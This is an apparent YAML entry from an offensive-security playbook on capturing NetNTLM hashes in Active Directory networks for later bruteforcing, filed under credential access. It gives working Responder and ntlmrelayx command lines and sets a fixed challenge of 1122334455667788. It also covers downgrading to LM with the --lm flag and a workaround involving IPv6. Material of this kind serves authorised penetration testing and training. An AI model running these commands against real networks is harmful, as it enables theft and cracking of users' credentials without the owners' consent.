title: Capture NetNTLM hashes
category: 
  - AD:
    - NTLM
tactic: Credential Access
tags: []
description: NetNTLM hashes can be grabbed and bruteforced

references:
  - https://github.com/lgandx/Responder
  - https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py

steps:
  - description: Start service to capture incoming NetNTLM requests
    options:
    
      - tool: responder
        usage: sudo python3 Responder.py -I eth0 --disable-ess --lm
        comments:
          - The config file should be changed to use the challenge 1122334455667788
          - lm flag is using to downgrade the protocol, but it can prevent the remote server to send any requests.
            The best approach is to make 2 attempts - with and without the flag.
          - Due to some issues in the code IPv6 should be enabled on the interface, otherwise you could have port access errors

      - tool: impacket_ntlmrelayx.py
        usage: ntlmrelayx.py -ntlmchallenge 1122334455667788 -of hashes.txt
        comments: it doesn't have many option, but can be useful if other tools are not available

comments:
  